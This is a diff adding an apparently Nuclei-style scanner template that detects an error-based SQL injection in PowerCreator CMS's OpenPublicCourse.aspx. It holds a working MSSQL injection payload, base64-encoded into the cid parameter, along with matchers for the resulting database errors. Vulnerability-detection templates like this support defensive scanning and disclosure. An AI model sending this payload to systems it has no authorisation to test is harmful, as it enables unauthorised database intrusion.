@@ -1,0 +1,40 @@
+id: powercreator-openpubliccourse-sqli
+info:
+  name: PowerCreator OpenPublicCourse.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: powercreator_cms
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "5 and 1=sys.fn_sqlvarbasetostr(HashBytes('MD5','{{t1}}'))--"
+  t3: "{{md5(t1)}}"
+  payload: "{{base64(t2)}}"
+
+http:
+  - method: GET
+    path:
+      - "/OpenPublicCourse.aspx?cid={{payload}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t3}}"
+        part: body
+      - type: word
+        words:
+          - "SqlException"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+        part: body
+      - type: regex
+        regex:
+          - "在将(.*?)值"
+        part: body
